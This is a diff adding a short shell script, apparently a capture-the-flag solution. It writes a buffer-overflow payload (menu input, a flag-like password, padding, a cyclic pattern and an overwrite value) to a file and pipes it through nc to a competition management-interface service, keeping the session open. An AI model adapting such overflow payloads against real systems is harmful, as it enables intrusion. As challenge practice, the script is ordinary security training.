@@ -1,0 +1,4 @@
+printf "1\nCTF{I_luv_buggy_sOFtware}\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nquit\x00aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaa\x27\x42\x41\x41\n" > overflow
+
+(cat overflow; cat) | nc mngmnt-iface.ctfcompetition.com 1337
+
